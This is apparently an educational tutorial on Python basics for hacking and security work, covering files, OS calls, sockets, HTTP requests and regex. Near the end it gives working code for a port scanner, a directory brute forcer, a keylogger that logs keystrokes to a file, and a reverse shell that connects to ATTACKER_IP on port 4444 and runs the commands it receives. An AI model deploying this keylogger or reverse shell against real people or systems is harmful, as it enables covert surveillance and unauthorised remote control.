# Python Scripting Basics 

Python is one of the most important languages for hackers, security researchers, and automation-focused engineers. It’s fast to write, easy to read, and comes with powerful libraries for networking, file manipulation, system interaction, and offensive tooling. This section introduces the essential Python skills needed for scripting, automation, reconnaissance, and basic exploitation tasks.

## Why Python Matters in Hacking
Python is ideal for:
- Automating repetitive tasks
- Parsing files, logs, and network data
- Writing quick scanners and enumeration tools
- Interacting with the OS and filesystem
- Building proof-of-concept exploits
- Working with sockets and network protocols
- Rapid prototyping before rewriting in C or Go

Python’s simplicity makes it perfect for fast, disposable scripts during engagements.

## Running Python
Check your Python version:
python3 --version

Run a script:
python3 script.py

Run Python interactively:
python3

Make a script executable:
chmod +x script.py  
./script.py

Add a shebang to the top of your script:
#!/usr/bin/env python3

## Basic Syntax Essentials

### Variables
x = 10  
name = "Andrews"  
is_admin = True

### Printing
print("Hello, world")  
print("Value:", x)

### Input
user = input("Enter username: ")

## Working with Strings
message = "Hello"  
print(message.upper())  
print(message.lower())  
print(message.replace("H", "J"))

String formatting:
name = "root"  
print(f"User: {name}")

## Working with Files

### Read a file
with open("data.txt", "r") as f:
    content = f.read()
    print(content)

### Write to a file
with open("output.txt", "w") as f:
    f.write("Scan complete\n")

### Append
with open("log.txt", "a") as f:
    f.write("New entry\n")

File handling is essential for log parsing, credential dumping, and automation.

## Working with the OS
import os

List files:
os.listdir(".")

Run a system command:
os.system("ls -la")

Get environment variables:
os.getenv("HOME")

Join paths safely:
os.path.join("/etc", "passwd")

## Working with JSON
import json

Load JSON:
data = json.load(open("config.json"))

Dump JSON:
json.dump(data, open("out.json", "w"), indent=4)

JSON is common in APIs, tools, and C2 frameworks.

## Working with Arguments
import sys

print(sys.argv)

Example:
python3 script.py target.com 80

sys.argv[1] → target  
sys.argv[2] → port

Arguments allow scripts to behave like real tools.

## Networking with Sockets
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect(("127.0.0.1", 80))  
s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")  
print(s.recv(1024))  
s.close()

Sockets are the foundation of scanners, backdoors, and custom protocols.

## Simple Port Scanner
import socket

target = "127.0.0.1"
ports = [22, 80, 443]

for port in ports:
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((target, port))
        print(f"Port {port} open")
    except:
        pass

This is the core of many enumeration tools.

## HTTP Requests with Requests Library
import requests

r = requests.get("https://example.com")  
print(r.status_code)  
print(r.text)

POST example:
requests.post("https://example.com/login", data={"user":"admin","pass":"123"})

Requests is essential for web hacking, automation, and brute forcing.

## Parsing HTML with BeautifulSoup
from bs4 import BeautifulSoup  
import requests

html = requests.get("https://example.com").text  
soup = BeautifulSoup(html, "html.parser")

for link in soup.find_all("a"):
    print(link.get("href"))

Useful for scraping, recon, and OSINT.

## Working with Subprocess
import subprocess

result = subprocess.run(["ls", "-la"], capture_output=True, text=True)  
print(result.stdout)

subprocess is safer and more flexible than os.system.

## Regular Expressions (Regex)
import re

pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

text = "Contact admin@example.com for help"
emails = re.findall(pattern, text)
print(emails)

Regex is critical for extracting credentials, emails, IPs, URLs, and tokens.

## Error Handling
try:
    x = 1 / 0
except Exception as e:
    print("Error:", e)

Error handling keeps scripts stable during scans and automation.

## Building a Simple Hacker Tool: Directory Brute Forcer
import requests

url = "http://target.com/"
wordlist = ["admin", "login", "uploads", "backup"]

for word in wordlist:
    full = url + word
    r = requests.get(full)
    if r.status_code == 200:
        print("Found:", full)

This is the foundation of directory enumeration tools.

## Building a Simple Keylogger (Linux Terminal Only)
import pynput.keyboard

def on_press(key):
    with open("keys.log", "a") as f:
        f.write(str(key) + "\n")

listener = pynput.keyboard.Listener(on_press=on_press)  
listener.start()  
listener.join()

Keyloggers demonstrate input capture concepts used in research and malware analysis.

## Building a Simple Reverse Shell
import socket  
import subprocess  
import os

s = socket.socket()  
s.connect(("ATTACKER_IP", 4444))

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())

s.close()

Reverse shells are foundational for understanding remote command execution.

## Virtual Environments
python3 -m venv env  
source env/bin/activate  
pip install requests

Virtual environments keep tools isolated and reproducible.

## Packaging a Script
Add a shebang:
#!/usr/bin/env python3

Make executable:
chmod +x tool.py

Move to PATH:
sudo mv tool.py /usr/local/bin/tool

Now it behaves like a real command-line tool.

## Practical Python Workflow for Hackers
When building a script, I follow this workflow:
1. Define the goal (scan, parse, automate, exploit)
2. Accept arguments (sys.argv)
3. Validate input
4. Perform the action (networking, file parsing, OS interaction)
5. Print clean output
6. Add error handling
7. Add logging if needed
8. Package it for reuse

This keeps scripts clean, reusable, and reliable.

## Key Takeaway
Python is one of the most powerful tools in a hacker’s toolkit. With just a few lines of code, I can automate tasks, interact with systems, parse data, build scanners, and prototype exploits. Mastering Python fundamentals unlocks the ability to create custom tools tailored to any engagement or research scenario.
